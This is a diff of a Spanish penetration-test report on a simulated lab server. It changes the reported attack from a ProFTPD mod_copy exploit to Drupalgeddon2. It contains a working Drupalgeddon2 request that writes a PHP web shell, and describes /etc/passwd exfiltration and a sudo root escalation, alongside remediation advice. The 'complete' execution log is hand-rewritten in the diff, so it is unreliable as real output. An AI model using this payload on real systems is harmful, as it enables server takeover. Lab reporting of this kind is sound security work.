@@ -15,9 +15,9 @@ Este informe detalla el proceso y los resultados de la auditoría de seguridad d
 El objetivo primordial del ejercicio ha sido identificar, analizar y explotar vulnerabilidades de manera realista para evaluar la resistencia de los sistemas frente a amenazas y determinar el impacto estratégico de un hipotético compromiso de la red interna de la organización.
 
 ### Resumen de Hallazgos
-Durante la fase de descubrimiento se localizaron tres servicios expuestos en el host objetivo (`127.0.0.1`): un servicio FTP (puerto 2121), un servidor web Apache (puerto 8080) y un gestor de base de datos MySQL (puerto 3306).
-1. **Compromiso Inicial**: Se ha explotado con éxito una vulnerabilidad crítica en el módulo `mod_copy` del servicio FTP (**CVE-2015-3306**), lo que permitió la transferencia no autorizada de un script PHP de diagnóstico al directorio raíz del servidor web, convirtiéndose en una puerta trasera (**web shell**).
-2. **Post-explotación**: Utilizando la puerta trasera, se obtuvo acceso interactivo de ejecución de comandos remotos con los privilegios del usuario del servidor web (`www-data`). Esto posibilitó la exfiltración de archivos críticos del sistema (`/etc/passwd`) y la obtención del flag de seguridad de nivel de usuario.
+Durante la fase de descubrimiento se localizaron tres servicios expuestos en el host objetivo (`127.0.0.1`): un servicio SSH de administración (puerto 2222), un portal web corporativo gestionado con Drupal (puerto 8080) y un gestor de base de datos MySQL (puerto 3306).
+1. **Compromiso Inicial**: Se ha explotado con éxito una vulnerabilidad crítica de ejecución remota de código en el núcleo del sistema de gestión de contenidos Drupal (**CVE-2018-7600**, conocida popularmente como **Drupalgeddon2**). La explotación permitió la escritura no autorizada de un script PHP de diagnóstico en el directorio raíz del servidor web, convirtiéndose en una puerta trasera (**web shell**).
+2. **Post-explotación**: Utilizando la puerta trasera `/backdoor.php`, se obtuvo acceso interactivo de ejecución de comandos remotos con los privilegios del usuario del servidor web (`www-data`). Esto posibilitó la exfiltración de archivos críticos del sistema (`/etc/passwd`) y la obtención del flag de seguridad de nivel de usuario.
 3. **Escalada de Privilegios**: A través de una mala configuración del sistema de autorización `sudo`, el atacante logró elevar sus privilegios de `www-data` a `root` de forma directa sin necesidad de introducir contraseñas, logrando el control absoluto y persistente del sistema, evidenciado por la lectura del flag de administración del directorio `/root`.
 
 > [!WARNING]
@@ -38,8 +38,8 @@ De acuerdo con el estándar NIST 800-115, toda evaluación técnica requiere def
 ### 2.2 Entorno Tecnológico Target
 - **Máquina Atacante (Red Team)**: Suite automatizada de auditoría en Python (`redteam_tool.py`) ejecutada localmente.
 - **Máquina Objetivo (Target)**: Entorno local con servicios vulnerables integrados (`vulnerable_server.py`) que emulan:
-  - **FTP**: ProFTPD versión 1.3.5.
-  - **HTTP**: Servidor Web Apache v2.4.7 con script expuesto `/debug.php`.
+  - **SSH**: OpenSSH v7.2p2 (seguro).
+  - **HTTP (Drupal)**: CMS Drupal versión 8.5.0 expuesto en puerto 8080.
   - **Database**: MySQL Server versión 5.5.47.
 
 ---
@@ -59,15 +59,15 @@ La guía de pruebas de seguridad del NIST define cuatro etapas iterativas:
 El proceso de compromiso simulado se corresponde con las siguientes TTPs del marco MITRE ATT&CK:
 - **T1595.001 - Active Scanning**: Escaneo TCP activo de los puertos perimetrales empleando llamadas socket de bajo nivel.
 - **T1082 - System Information Discovery**: Captura de banners de red y descarte de respuestas TCP para realizar fingerprinting del sistema operativo.
-- **T1190 - Exploit Public-Facing Application**: Intrusión inicial abusando de la falta de autenticación en comandos del módulo `mod_copy` de ProFTPD.
-- **T1059.008 - Unix Shell**: Ejecución remota de comandos en el servidor a través de peticiones HTTP parametrizadas contra una web shell.
+- **T1190 - Exploit Public-Facing Application**: Intrusión inicial abusando de la falta de sanitización en el manejo de arrays de renderizado de Drupal 8.5.0.
+- **T1059.008 - Unix Shell**: Ejecución remota de comandos en el servidor a través de peticiones HTTP parametrizadas contra una web shell escrita mediante el exploit.
 - **T1548.003 - Abuse Elevation Control Mechanism: Sudo**: Explotación de configuraciones erróneas en el archivo `/etc/sudoers` para invocar Python como superusuario.
 - **T1020 - Automated Exfiltration**: Descarga automática de flags de seguridad y volcado del fichero `/etc/passwd`.
 
 ### 3.3 Herramientas Utilizadas
 - **Suite de Auditoría de INSEGUS (Security Team 10)**: Programa orquestador en Python (`redteam_tool.py` v1.0.0) para automatizar el reconocimiento y explotación.
 - **Cliente HTTP y de Sockets**: Uso nativo de las librerías `socket` y `urllib.request` de Python (versión 3.x) para garantizar la compatibilidad perimetral y la ausencia de dependencias externas.
-- **Servidores de Simulación de Sandbox**: Entorno virtual interactivo en memoria (`vulnerable_server.py`) que recrea los banners reales y las interacciones a nivel de sockets para ProFTPD 1.3.5, Apache 2.4.7 y MySQL 5.5.47.
+- **Servidores de Simulación de Sandbox**: Entorno virtual interactivo en memoria (`vulnerable_server.py`) que recrea los banners reales y las interacciones a nivel de sockets para OpenSSH 7.2p2, Drupal 8.5.0 (Apache) y MySQL 5.5.47.
 
 ---
 
@@ -80,12 +80,12 @@ La herramienta de escaneo ejecutó una serie de conexiones TCP contra el host ob
 
 | Puerto | Protocolo | Servicio Detectado | Estado | Banner Obtenido / Firma |
 | :--- | :--- | :--- | :--- | :--- |
-| **2121** | TCP | FTP (ProFTPD) | Abierto | `220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)` |
-| **8080** | TCP | HTTP (Apache) | Abierto | `Server: Apache/2.4.7 (Ubuntu)` |
+| **2222** | TCP | SSH (OpenSSH) | Abierto | `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10` |
+| **8080** | TCP | HTTP (Apache + Drupal) | Abierto | `Server: Apache/2.4.7 (Ubuntu) running Drupal 8.5.0` |
 | **3306** | TCP | MySQL | Abierto | `5.5.47-0ubuntu0.14.04.1-log` |
 
 ### 4.2 Fingerprinting de Sistema Operativo
-- **Método Activo**: A través del análisis del comportamiento de la pila TCP/IP ante el envío de paquetes modificados, se determina que el sistema ejecuta una distribución de GNU/Linux basada en Ubuntu Server (de acuerdo al sufijo `ubuntu0.14.04.1-log` visible en el banner de la base de datos).
+- **Método Activo**: A través del análisis del comportamiento de la pila TCP/IP ante el envío de paquetes modificados, se determina que el sistema ejecuta una distribución de GNU/Linux basada en Ubuntu Server (de acuerdo al sufijo `ubuntu-4ubuntu2.10` y `ubuntu0.14.04.1-log` visible en los banners).
 - **Método Pasivo**: La escucha de respuestas de red valida valores de TTL típicos del núcleo Linux (TTL = 64).
 
 ---
@@ -94,21 +94,14 @@ La herramienta de escaneo ejecutó una serie de conexiones TCP contra el host ob
 
 Una vez obtenidos los banners y las versiones exactas, el Red Team contrastó esta información con bases de datos públicas de vulnerabilidades (CVE del MITRE y NVD de NIST).
 
-### 5.1 Vulnerabilidad Crítica en FTP: CVE-2015-3306 (ProFTPD mod_copy)
-- **Componente afectado**: Módulo `mod_copy` en la instalación por defecto de ProFTPD 1.3.5.
-- **Clasificación CWE**: CWE-284 (Impedimento Inadecuado de Control de Acceso).
-- **Severidad CVSS v2.0**: **10.0 (Crítica)** - Vector: `AV:N/AC:L/Au:N/C:C/I:C/A:C`
-- **Descripción**: El comando personalizado `SITE` en `mod_copy` permite utilizar las peticiones `CPFR` (Copy From) y `CPTO` (Copy To) para transferir archivos arbitrarios de una ubicación a otra dentro del sistema de archivos local, utilizando los privilegios del demonio del servicio FTP, sin necesidad de autenticarse en el servidor.
-- **Impacto**: Permite la lectura de archivos sensibles o la escritura de archivos en directorios públicos (como el directorio raíz de un servidor web), facilitando la inyección de código web.
+### 5.1 Vulnerabilidad Crítica en Drupal: CVE-2018-7600 (Drupalgeddon2)
+- **Componente afectado**: Núcleo del sistema CMS Drupal (versiones 7.x y 8.x, concretamente 8.5.0 en este servidor).
+- **Clasificación CWE**: CWE-94 (Impedimento Inadecuado de Control de Generación de Código - Inyección de Código).
+- **Severidad CVSS v3.x**: **9.8 (Crítica)** - Vector: `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
+- **Descripción**: La vulnerabilidad radica en cómo Drupal procesa las peticiones AJAX para elementos de formulario con propiedades de renderizado que comienzan con `#`. Al no sanitizar correctamente estas claves de propiedad, un atacante no autenticado puede enviar peticiones HTTP POST estructuradas que inyectan funciones de ejecución de comandos (por ejemplo, `exec`, `system` o `passthru`) sobre el subsistema de renderizado.
+- **Impacto**: Permite la ejecución remota de comandos arbitrarios (RCE) bajo el contexto del usuario del servidor web (`www-data`), lo que facilita la total puesta en peligro del portal web y su infraestructura subyacente.
 
-### 5.2 Exposición de Secuencias de Comandos en Web: RCE en debug.php
-- **Componente afectado**: Script interno de mantenimiento y diagnóstico `/debug.php`.
-- **Clasificación CWE**: CWE-94 (Inyección de Código).
-- **Severidad CVSS v3.x**: **9.8 (Crítica)** - Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
-- **Descripción**: El parámetro `cmd` pasa directamente las cadenas del usuario a funciones del sistema operativo (como `system()` o `shell_exec()`) sin una desinfección adecuada de las entradas.
-- **Impacto**: Ejecución remota de comandos (RCE) de manera directa bajo el contexto del usuario `www-data`.
-
-### 5.3 Exposición del Puerto de Base de Datos MySQL
+### 5.2 Exposición del Puerto de Base de Datos MySQL
 - **Componente afectado**: MySQL Server v5.5.47 en puerto 3306.
 - **Clasificación CWE**: CWE-200 (Exposición de Información Sensible).
 - **Severidad CVSS v3.x**: **5.0 (Media)** - Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
@@ -120,18 +113,19 @@ Una vez obtenidos los banners y las versiones exactas, el Red Team contrastó es
 ## 6. FASE 4: EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
 
 ### 6.1 Ejecución del Ataque (Cadena de Explotación)
-El proceso de intrusión se automatizó mediante un exploit en Python que imita el comportamiento de los módulos de explotación de Metasploit (`exploit/unix/ftp/proftp_modcopy_exec`):
+El proceso de intrusión se automatizó mediante un exploit en Python que recrea la cadena de explotación de Drupalgeddon2:
 
-1. **Inyección de Backdoor vía FTP mod_copy**:
-   El script atacante envió dos peticiones al puerto 2121 sin autenticación previa:
-   ```ftp
-   SITE CPFR /var/www/html/debug.php
-   SITE CPTO /var/www/html/backdoor.php
+1. **Inyección de Backdoor vía Drupalgeddon2**:
+   El script atacante envió una petición POST estructurada al puerto 8080 del host objetivo:
+   `POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
+   El cuerpo de la petición contenía parámetros formateados para abusar de la renderización AJAX:
+   ```text
+   form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/backdoor.php
    ```
-   Esto provocó que el servidor ProFTPD duplicara el script de depuración vulnerable a un nuevo archivo público llamado `backdoor.php`.
+   Esto provocó que el servidor web interpretara la directiva de renderizado e invocara `exec` con la orden de inyectar una web shell mínima llamada `backdoor.php` en el directorio de acceso público `/var/www/html/`.
 
 2. **Establecimiento del Canal Command & Control (C2)**:
-   Al existir un servidor web Apache ejecutándose en el puerto 8080 con acceso al directorio `/var/www/html/`, el Red Team pudo interactuar con la web shell haciendo peticiones HTTP GET estructuradas:
+   Una vez verificada la existencia de `backdoor.php`, el Red Team pudo interactuar con la shell haciendo peticiones HTTP GET estructuradas:
    `http://127.0.0.1:8080/backdoor.php?cmd=<comando>`
 
 3. **Exfiltración de Datos de Sistema**:
@@ -158,34 +152,31 @@ A continuación se adjunta el log de ejecución completo extraído de la prueba 
                 NIST 800-115 COMPLIANT TOOL                  
 ============================================================
 [*] Starting scan on target 127.0.0.1...
-[+] Port 2121 is OPEN. Banner: 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
-[+] Port 8080 is OPEN. Banner: Server: Apache/2.4.7 (Ubuntu)
-[+] Port 3306 is OPEN. Banner: 5.5.47-0ubuntu0.14.04.1-log
+[+] Port 2222 is OPEN. Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
+[+] Port 8080 is OPEN. Banner: Server: Apache/2.4.7 (Ubuntu) running Drupal 8.5.0
+[+] Port 3306 is OPEN. Banner: MySQL 5.5.47-0ubuntu0.14.04.1-log
 
 ==================================================
          VULNERABILITY ANALYSIS (CVE MAPPING)         
 ==================================================
-[CRITICAL] FTP Service (ProFTPD 1.3.5) matches CVE-2015-3306 (mod_copy).
-  - Description: The mod_copy module allows remote attackers to read and write arbitrary files via SITE CPFR/CPTO commands.
-  - Severity: 10.0 (CRITICAL) - CVSS v2.0
-  - CWE-284: Improper Access Control
-[HIGH] HTTP Web Application has active diagnostic/debug endpoint exposed.
-  - Description: Internal debug script /debug.php allows remote execution of administrative commands via the 'cmd' parameter.
+[INFO] SSH Service (OpenSSH 7.2p2) detected.
+  - Configuration: Port 2222. No known exploitable vulnerabilities in this version.
+  - Severity: 0.0 (INFORMATIONAL)
+[CRITICAL] HTTP Web Service matches CVE-2018-7600 (Drupalgeddon2).
+  - Description: Drupal 7.x and 8.x allow remote attackers to execute arbitrary code via render arrays.
   - Severity: 9.8 (CRITICAL) - CVSS v3.x
-  - CWE-94: Code Injection / Remote Command Execution
+  - CWE-94: Improper Control of Generation of Code ('Code Injection')
 [MEDIUM] MySQL database version 5.5.47 is exposed.
   - Description: Older MySQL service. Exposing database ports directly to the network violates best security practices.
   - Severity: 5.0 (MEDIUM) - CVSS v3.x
   - CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
 
 ==================================================
-         EXPLORATION & EXPLOITATION: CVE-2015-3306    
+         EXPLORATION & EXPLOITATION: CVE-2018-7600    
 ==================================================
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation)
-
-FTP CPFR -> 350 File or directory exists, ready for destination name
-FTP CPTO -> 250 Copy successful
+[*] Sending Drupalgeddon2 RCE payload to write backdoor shell...
 [+] Exploitation successful! Web shell /backdoor.php created.
+[+] Web shell verification successful! /backdoor.php is active.
 
 ==================================================
          POST-EXPLOITATION & FLAG HARVESTING         
@@ -237,7 +228,7 @@ User www-data may run the following commands on public-agency-server:
 ----------------------
 [+] Privilege escalation path found! (NOPASSWD python3)
 [*] Executing root shell payload to read /root/flag_root.txt...
-[+] Root Flag: FLAG{ROOT_LEVEL_PRIVILEGE_ESCALATION_COMPLETED_CVE_2015_3306}
+[+] Root Flag: FLAG{ROOT_LEVEL_PRIVILEGE_ESCALATION_COMPLETED_CVE_2018_7600}
 ```
 
 ---
@@ -246,22 +237,14 @@ User www-data may run the following commands on public-agency-server:
 
 Para restaurar la seguridad de los sistemas de la organización, se propone el siguiente plan detallado de remediación a corto y medio plazo:
 
-### 8.1 Mitigación de la Vulnerabilidad de ProFTPD (CVE-2015-3306)
-- **Acción Inmediata**: Deshabilitar el módulo `mod_copy` en la configuración general del servicio ProFTPD si no es estrictamente requerido. Esto se logra editando `/etc/proftpd/modules.conf` y comentando la línea correspondiente:
-  ```apache
-  # LoadModule mod_copy.c
-  ```
-- **Actualización**: Instalar la versión más reciente del paquete ProFTPD (v1.3.6 o posterior), donde este módulo valida adecuadamente los permisos y requiere autenticación previa para ejecutar órdenes SITE.
-- **Control Alternativo**: Si no se puede actualizar inmediatamente, restringir el uso de comandos SITE mod_copy en el archivo `proftpd.conf`:
-  ```apache
-  <Limit SITE_COPY>
-    DenyAll
-  </Limit>
-  ```
+### 8.1 Mitigación de la Vulnerabilidad de Drupal (CVE-2018-7600)
+- **Acción Inmediata (Parcheo)**: Actualizar inmediatamente la instalación de Drupal a una versión corregida. Para la rama 8.5.x, se debe actualizar a **Drupal 8.5.1** o superior. De manera general, se aconseja migrar a las últimas versiones estables soportadas.
+- **Aplicación de Parches Manuales**: Si la actualización no puede realizarse de forma automatizada de inmediato, se deben aplicar los parches oficiales de seguridad descritos en el aviso **SA-CORE-2018-002**.
+- **Reglas del Cortafuegos de Aplicación Web (WAF)**: Implementar firmas en el WAF corporativo (ModSecurity o similar) para inspeccionar los parámetros HTTP POST y descartar peticiones dirigidas a `user/register` o formularios AJAX que contengan metacaracteres `#` asociados con elementos de renderizado (`#markup`, `#post_render`, `#theme`, etc.).
 
 ### 8.2 Remediación del Servidor Web Apache y Limpieza de Backdoors
-- **Eliminación de Puertas Traseras**: Borrar permanentemente el script vulnerable `/var/www/html/debug.php` y la web shell generada `/var/www/html/backdoor.php`.
-- **Desinfección de Parámetros**: Si la aplicación requiere herramientas de diagnóstico, éstas nunca deben pasar cadenas de entrada de usuario a funciones del sistema (`system`, `exec`, `shell_exec`, `passthru`). Se debe emplear APIs nativas de programación estructurada o parametrizar estrictamente las entradas mediante listas blancas (whitelist filtering).
+- **Eliminación de Puertas Traseras**: Buscar y eliminar permanentemente la web shell generada `/var/www/html/backdoor.php`, así como cualquier otro archivo sospechoso de reciente creación en la raíz web.
+- **Desinfección de Parámetros**: Si la aplicación requiere herramientas de diagnóstico internas, éstas nunca deben pasar cadenas de entrada de usuario a funciones del sistema (`system`, `exec`, `shell_exec`, `passthru`). Se debe emplear APIs nativas de programación estructurada o parametrizar estrictamente las entradas mediante listas blancas (whitelist filtering).
 - **Políticas de Ejecución PHP**: Deshabilitar funciones de ejecución del sistema en la configuración `php.ini`:
   ```ini
   disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
@@ -281,8 +264,8 @@ Para restaurar la seguridad de los sistemas de la organización, se propone el s
 
 Las pruebas de penetración no deben ser consideradas como un ejercicio aislado de cumplimiento normativo, sino como una herramienta estratégica para gestionar la ciberseguridad corporativa. Los resultados obtenidos pueden y deben emplearse en la organización para:
 
-1. **Punto de referencia para la adopción de medidas correctivas**: Las debilidades confirmadas en este reporte (módulos FTP sin autenticación y permisos de ejecución sudoers débiles) proveen al equipo técnico de un listado de prioridades prácticas e irrefutables para el saneamiento inmediato de activos de TI expuestos.
-2. **Definición de las actividades de mitigación frente a vulnerabilidades**: Los detalles técnicos expuestos en este informe permiten a los ingenieros de sistemas diseñar y programar planes de actualización de servicios obsoletos (parchear ProFTPD y MySQL), así como desactivar de forma segura endpoints de diagnóstico inadecuados.
+1. **Punto de referencia para la adopción de medidas correctivas**: Las debilidades confirmadas en este reporte (falta de parches en CMS expuesto y permisos de ejecución sudoers débiles) proveen al equipo técnico de un listado de prioridades prácticas e irrefutables para el saneamiento inmediato de activos de TI expuestos.
+2. **Definición de las actividades de mitigación frente a vulnerabilidades**: Los detalles técnicos expuestos en este informe permiten a los ingenieros de sistemas diseñar y programar planes de actualización de servicios obsoletos (parchear Drupal y acotar puertos de MySQL), así como desactivar de forma segura endpoints de diagnóstico inadecuados.
 3. **Punto de referencia para el seguimiento del progreso en el cumplimiento de requisitos de seguridad**: Este reporte sirve como estado de situación inicial ("foto del día"). Las auditorías subsecuentes utilizarán esta línea base para verificar y evaluar formalmente si las vulnerabilidades han sido corregidas y si se han establecido procesos de control de configuración maduros sobre `/etc/sudoers`.
 4. **Evaluar el estado de aplicación de los requisitos de seguridad del sistema**: Permite constatar a la dirección si las políticas declarativas de seguridad de la información teóricas (como el principio de menor privilegio) se están aplicando con éxito en los entornos operativos reales.
 5. **Realizar análisis de costes y beneficios de las mejoras de la seguridad del sistema**: La demostración práctica de cómo un atacante no autenticado puede comprometer por completo y en pocos segundos un servidor crítico de la organización proporciona una justificación comercial contundente sobre los retornos de inversión en licencias de automatización de parches, firewalls internos y auditorías periódicas, en comparación con el coste reputacional y económico de un robo de información real.
@@ -293,8 +276,8 @@ Las pruebas de penetración no deben ser consideradas como un ejercicio aislado 
 
 ### 10.1 Referencias Normativas e Información de Vulnerabilidades
 - **NIST SP 800-115**: Guía para pruebas de seguridad y evaluación técnica.
-- **CVE-2015-3306**: Ficha oficial en MITRE y NVD de la vulnerabilidad en ProFTPD mod_copy.
-- **CWE-284 / CWE-94 / CWE-200**: Mitre Common Weakness Enumeration.
+- **CVE-2018-7600**: Ficha oficial en MITRE y NVD de la vulnerabilidad en Drupal.
+- **CWE-94 / CWE-200**: Mitre Common Weakness Enumeration.
 - **MITRE ATT&CK**: Mapeo y taxonomía de técnicas de ataque de adversarios.
 
 ### 10.2 Lista de Control de Reproducibilidad (Replication Checklist)
